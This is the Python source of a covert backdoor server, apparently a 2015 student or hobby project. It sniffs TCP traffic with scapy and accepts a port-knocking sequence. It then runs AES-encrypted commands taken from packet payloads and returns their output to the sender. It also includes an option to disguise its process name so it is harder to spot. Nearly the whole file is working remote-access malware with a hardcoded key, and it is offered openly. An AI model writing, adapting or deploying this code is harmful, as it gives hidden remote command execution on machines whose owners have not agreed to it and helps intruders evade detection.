# ========================================================================
# File:         backdoor.py
# Author:       David Wang
# Date:         October 2015
# Functions:    encrypt_val()       - Encrypts a string
#               decrypt_val()       - Decrypts the encyrpted string
#               verify_root()       - Checks if user is root
#               send_pkt()          - Sends a packet
#               send_data()         - Sends the outpt of a command
#               run_cmd()           - Gets a command from a packet, run it,
#                                     and send back the output
#               port_knock_auth()   - Handles port knocking
#               main()              - Main function
#
# Description:
#   Backdoor server. Sniffs traffic with tcpdump and activates temote
#   command execution if right port pattern is provided. The output is
#   send back to the origin IP. AES encryption is used to encrypt the data
#   back and forth between the client and backdoor.
# ========================================================================
import time
import base64
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from subprocess import *
from Crypto.Cipher import AES
CONN_IPS = {}
MASTER_KEY = "CorrectHorseBatteryStapleGunHead"


# ========================================================================
# Function: encrypt_val()
# Input:    Text        - Text string to be encrypted
# Return:   cipher_text - Encrypted string
#
# Desc.:    Encrypts a string using AES from the PyCrypto library. The
#           master key is provided as a global in the file and only the
#           first 32 characters are used. If the master key is shorter
#           than 32 characters, it will be padded with '0's. The
#           encrypted string is then converted to base64 for an extra
#           layer of encoding.
# ========================================================================
def encrypt_val(text):
    secret = AES.new(MASTER_KEY)
    tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
    cipher_text = base64.b64encode(secret.encrypt(tag_string))

    return cipher_text


# ========================================================================
# Function: decrypt_val()
# Input:    cipher - Encrypted string to be decrypted
# Return:   result - Decrypted string
#
# Desc.:    Undoes the encryption provided by encrypt_val(). First decodes
#           the b64 string then decrypts the AES version with the global
#           master key. See encrypt_val() on master key usage. Trailing
#           null characters added during encryption are stripped.
# ========================================================================
def decrypt_val(cipher):
    secret = AES.new(MASTER_KEY)
    decrypted = secret.decrypt(base64.b64decode(cipher))
    result = decrypted.rstrip("\0")
    return result


# ========================================================================
# Function: verify_root()
# Input:    None
# Return:   None
#
# Desc.:    Checks if the uid running the program is root. If not, exit.
# ========================================================================
def verify_root():
    if(os.getuid() != 0):
        exit("This program must be run with root/sudo")


# ========================================================================
# Function: send_pkt()
# Input:    pkt - Scapy packet object
# Return:   None
#
# Desc.:    Sends a packet. This function is here in case we need to
#           change how we send every single packet (for example, to use)
#           layer 2 instead of layer 3, we change "send()" to "sendp()".)
# ========================================================================
def send_pkt(packet):
    send(packet)


# ========================================================================
# Function: send_data()
# Input:    destIP  - Destination IP (string)
#           port    - port to send to (string)
#           data    - Data representing the output of a command (string)
# Return:   None
#
# Desc.:    Sends the output to the client. The output is placed in
#           the payload in the raw layer of the packet.
# ========================================================================
def send_data(destIP, port, data):
    packet = IP(dst=destIP) / TCP(sport=80, dport=port) / Raw(load=data)
    send_pkt(packet)


# ========================================================================
# Function: run_cmd()
# Input:    packet  - Scapy packet object
# Return:   None
#
# Desc.:    Executes the command using Python's subprocess library. The
#           function gets the command from the raw layer of the packet,
#           decrypts it, and runs the command with subprocess.Popen. The
#           result is retrieve with subprocess.communicate() from stdout
#           and stderr. We take the stdout result by specifying index 0.
#           The result is then send back to the IP where the packet
#           originally came from.
#           A 100ms sleep is added due to LAN environments where the
#           packets may be sending too fast for scapy sniffers to catch
#           properly.
# ========================================================================
def run_cmd(packet):
    data = packet['Raw'].load
    data = decrypt_val(data)
    output = []
    try:
        command, arguments = data.split(' ', 1)
    except ValueError:
        arguments = None
    try:
        if(arguments is not None):
            out, err = Popen([command, arguments], stdout=PIPE, stderr=PIPE).communicate()
        else:
            out, err = Popen(data, stdout=PIPE, stderr=PIPE).communicate()
    except OSError:
        output = "Invalid Command / Command not found"
    if(out):
        output.append(out)
    if(err):
        output.append(err)
    output = encrypt_val("".join(output))
    time.sleep(0.1)
    send_data(packet[1].src, packet[2].sport, output)


# ========================================================================
# Function: port_knock_auth
# Input:    packet  - Scapy packet object
# Return:   None
# Desc.:    Gets the IP and destination port from the packet and
#           authenticates it with a list of access codes (ports). If the
#           IP successfully accessed the ports in sequence, then the
#           server will begin listening for commands from the IP. If any
#           part of the port knocking is wrong, then the IP is removed
#           from the list of connecting ips and will no longer be
#           processed.
# ========================================================================
def port_knock_auth(packet):
    global CONN_IPS
    ip = packet[1].src
    dport = packet[2].dport
    access = [2525, 14156, 6364]
    dc = 4242

    # If the connecting IP has connected before
    if(ip in CONN_IPS):
        auth = CONN_IPS[ip]
        # Connecting IP is already authenticated
        if(auth == 3):
            # Matches first disconnect port
            if(dport == dc):
                del CONN_IPS[ip]
                print("{} has disconnected".format(ip))
                return
            # Else just decode the packet
            try:
                run_cmd(packet)
            except IndexError:
                pass
        # If port is irrelevant
        elif(dport not in access):
            del CONN_IPS[ip]
        # Connecting IP matches second knock
        elif(dport == access[auth]):
            CONN_IPS[ip] += 1
        else:
            # Fail-safe
            del CONN_IPS[ip]
    elif(dport == access[0]):
        CONN_IPS[ip] = 1


# ========================================================================
# Function: main()
# Input:    None
# Return:   None
# Desc.:    Main function of the backdoor program. First checks to see if
#           the process name should be hidden. Then begins sniffing either
#           all TCP traffic or TCP traffic from a certain interface (if
#           the -i/--iface flag is specified). Each packet that the
#           backdoor receives is sent to port_knock_auth().
# ========================================================================
def main():
    if(args.pname is not None):
        import setproctitle
        setproctitle.setproctitle(args.pname)
    print("Sniffing for traffic...")
    if(args.iface is None):
        sniff(filter="tcp", prn=port_knock_auth)
    else:
        sniff(filter="tcp", iface=args.iface, prn=port_knock_auth)


if __name__ == '__main__':
    verify_root()
    parser = argparse.ArgumentParser("Python backdoor server")
    parser.add_argument("-p", "--pname", help="Disguise process title")
    parser.add_argument("-i", "--iface", help="Interface to sniff packets on")
    args = parser.parse_args()
    try:
        main()
    except KeyboardInterrupt:
        exit("Ctrl+C received. Exiting...")
